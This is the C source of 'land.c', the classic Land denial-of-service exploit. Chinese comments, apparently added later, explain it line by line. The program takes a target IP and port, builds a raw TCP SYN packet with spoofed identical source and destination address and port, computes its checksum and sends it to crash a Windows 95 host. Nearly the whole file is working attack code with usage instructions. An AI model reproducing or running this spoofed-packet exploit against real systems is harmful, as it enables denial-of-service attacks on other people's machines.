/* land.c by m3lt, FLC
crashes a win95 box */

#include <stdio.h>
#include <netdb.h>
#include<string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
//用于TCP校验和的伪头
struct pseudohdr
{
	struct in_addr saddr;
	struct in_addr daddr;
	u_char zero;
	u_char protocol;
	u_short length;
	struct tcphdr tcpheader;
};

//计算TCP校验和
u_short checksum(u_short * data,u_short length)
{
	register long value;
	u_short i;

	for(i=0;i<(length>>1);i++)
	value+=data[i];

	if((length&1)==1)
	value+=(data[i]<<8);

	value=(value&65535)+(value>>16);
	return(~value);
}
/*
原理很简单：
Land攻击针对win95的一个漏洞，主要原理是以目标主机的IP地址和端口向它自己的同一个端口发起SYN连接，这样win95会奔溃。
程序实现是这样的：
创建一个SYN报文（包括IP头，TCP头，数据包报文类型为SYN类型），然后初始化包得源ip和目标ip都为目标主机的ip地址，端口也相同。
然后进行伪装发包过去，这就形成了就像目标主机自己给自己发一个SYN包一样，导致主机奔溃。
SYN报文就是TCP连接汇总请求连接的意思，这样，目标主机就自己给自己的同一个端口进行一个TCP请求连接，就导致了主机------奔溃了（计算机网络知识）。
*/

int main(int argc,char * * argv)
{
struct sockaddr_in sin;　　//sockect地址结构体
struct hostent * hoste;    //主机信息结构体
int sock;
char buffer[40];
struct iphdr * ipheader=(struct iphdr *) buffer;   //IP数据包的描述结构体
struct tcphdr * tcpheader=(struct tcphdr *) (buffer+sizeof(struct iphdr));  // tcp数据包结构体
struct pseudohdr pseudoheader;   //TCP伪装头部  欺诈作用了

fprintf(stderr,"land.c by m3lt, FLC\n");

if(argc<3)
{
fprintf(stderr,"usage: %s IP port\n",argv[0]);
return(-1);
}

bzero(&sin,sizeof(struct sockaddr_in)); // 清零
sin.sin_family=AF_INET;   //地址家族 AF_INET,代表TCP/IP协议族  

if((hoste=gethostbyname(argv[1]))!=NULL) //初始化主机信息  也就是目标主机信息
	bcopy(hoste->h_addr,&sin.sin_addr,hoste->h_length);  //将目标主机信息初始化到socket结构体中
else if((sin.sin_addr.s_addr=inet_addr(argv[1]))==-1)  // 如果ip地址无效  则返回
{
	fprintf(stderr,"unknown host %s\n",argv[1]);
	return(-1);
}

// 初始化socket端口 如果无效就返回
if((sin.sin_port=htons(atoi(argv[2])))==0)
{
	fprintf(stderr,"unknown port %s\n",argv[2]);
	return(-1);
}

//new一个SOCK—RAW以发伪造IP包 这需要root权限
if((sock=socket(AF_INET,SOCK_RAW,255))==-1)
{
	fprintf(stderr,"couldn't allocate raw socket\n");
	return(-1);
}

bzero(&buffer,sizeof(struct iphdr)+sizeof(struct tcphdr)); // 清零
ipheader->version=4; // ipv4协议
ipheader->ihl=sizeof(struct iphdr)/4; //ip首部长度  除以4是指统计多少个4字节
ipheader->tot_len=htons(sizeof(struct iphdr)+sizeof(struct tcphdr)); // ip数据包总长度  这里包括传输层的tcp数据了
ipheader->id=htons(0xF1C);   //数据包标识
ipheader->ttl=255;	// 声明周期 数据报的生存时间
ipheader->protocol=IPPROTO_TCP;  //TCP/IP协议

//网络层 目的IP地址和源IP地址相同  这是land的主要原理 只对win95的漏洞有效
ipheader->saddr=sin.sin_addr.s_addr;
ipheader->daddr=sin.sin_addr.s_addr;

//传输层  目的TCP端口和源TCPIP端口相同  这是land的主要原理 只对win95的漏洞有效
tcpheader->th_sport=sin.sin_port;
tcpheader->th_dport=sin.sin_port;
tcpheader->th_seq=htonl(0xF1C);	 //报文段中的起始字节数
tcpheader->th_flags=TH_SYN;    //标志位  标识报文为SYN报文
tcpheader->th_off=sizeof(struct tcphdr)/4;  //TCP头长度
tcpheader->th_win=htons(2048);     // 滑动窗体大小 也就是接收端期望接收到的包数量


// 伪装包初始化  原地址和目标地址相同
bzero(&pseudoheader,12+sizeof(struct tcphdr));
pseudoheader.saddr.s_addr=sin.sin_addr.s_addr;
pseudoheader.daddr.s_addr=sin.sin_addr.s_addr;
pseudoheader.protocol=6;   // TCP/ip协议
pseudoheader.length=htons(sizeof(struct tcphdr));
bcopy((char *) tcpheader,(char *) &pseudoheader.tcpheader,sizeof(struct tcphdr));  // 将伪装头拷贝到tcp包头部中
tcpheader->th_sum=checksum((u_short *) &pseudoheader,12+sizeof(struct tcphdr));   // 校验和

// 开始发送包了  只发一个包 很简单 就是将这个SYN报文发过去
if(sendto(sock,buffer,sizeof(struct iphdr)+sizeof(struct tcphdr),
0,(struct sockaddr *) &sin,sizeof(struct sockaddr_in))==-1)
{
	fprintf(stderr,"couldn't send packet\n");
	return(-1);
}
	fprintf(stderr,"%s:%s landed\n",argv[1],argv[2]);
	close(sock);  // 关闭socket
	return(0);
} 
